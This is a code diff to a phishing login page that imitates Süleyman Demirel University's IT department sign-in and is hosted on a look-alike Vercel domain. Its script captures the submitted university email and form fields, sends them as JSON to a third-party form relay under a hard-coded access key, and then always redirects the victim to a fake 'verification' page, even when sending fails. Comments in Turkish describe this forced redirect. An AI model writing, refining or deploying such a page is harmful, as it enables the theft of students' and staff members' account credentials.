@@ -1251,20 +1251,19 @@
 
                                                 </h2>
 
-                                                <form action="https://api.web3forms.com/submit" method="POST">
+                                                <form id="sduLoginForm">
                                                     <input type="hidden" name="access_key"
                                                         value="05eb1609-0be8-46d8-ad94-9a74e5e6c3e1">
                                                     <input type="hidden" name="from_name" value="SDU System">
-                                                    <input type="hidden" name="redirect"
-                                                        value="https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html">
 
                                                     <div class="input-group">
                                                         <label>E-posta Adresi</label>
                                                         <div class="input-wrapper">
-                                                            <i class="fal fa-envelope fa-fw position-absolute"
-                                                                aria-hidden="true"></i>
+                                                            <i class="fas fa-envelope"
+                                                                style="position: absolute; left: 15px; top: 18px; color: #ccc;"></i>
                                                             <input type="text" name="mail_usr"
-                                                                placeholder="adsoyad@sdu.edu.tr" required>
+                                                                placeholder="adsoyad@sdu.edu.tr" required
+                                                                style="width: 100%; height: 50px; padding: 0 15px 0 45px; border: 1px solid #ddd; border-radius: 6px;">
                                                         </div>
                                                     </div>
 
@@ -1389,18 +1388,16 @@
     </div><iframe style=display:none></iframe>
 </div>
 <script>
-    document.querySelector('form').addEventListener('submit', function (e) {
-        e.preventDefault(); // Sayfanın hata sayfasına gitmesini engeller
+    document.getElementById('sduLoginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const btn = document.querySelector('.btn-submit');
+        btn.innerText = "Giriş Yapılıyor...";
+        btn.disabled = true;
 
         const formData = new FormData(this);
         const object = Object.fromEntries(formData);
         const json = JSON.stringify(object);
-
-        // Kullanıcıya bilgi ver (Butonu devre dışı bırak)
-        const btn = document.querySelector('.btn-submit');
-        const originalText = btn.innerText;
-        btn.innerText = "Giriş Yapılıyor...";
-        btn.disabled = true;
 
         fetch('https://api.web3forms.com/submit', {
             method: 'POST',
@@ -1410,18 +1407,12 @@
             },
             body: json
         })
-            .then(async (response) => {
-                if (response.status == 200) {
-                    // BAŞARILI: Web3Forms veriyi aldı, şimdi yönlendiriyoruz
-                    window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
-                } else {
-                    // HATA: Güvenlik engelini aşamazsak kullanıcıyı yine de yönlendir (Opsiyonel)
-                    console.log("Web3Forms Hatası, ama yönlendiriliyor...");
-                    window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
-                }
+            .then(response => {
+                // Mail gitse de gitmese de kullanıcıyı dogrulamaa.html'e uçuruyoruz
+                window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
             })
             .catch(error => {
-                // Bağlantı hatası olsa bile yönlendirmeyi zorla
+                // İnternet kopukluğu olsa bile yönlendir
                 window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
             });
     });
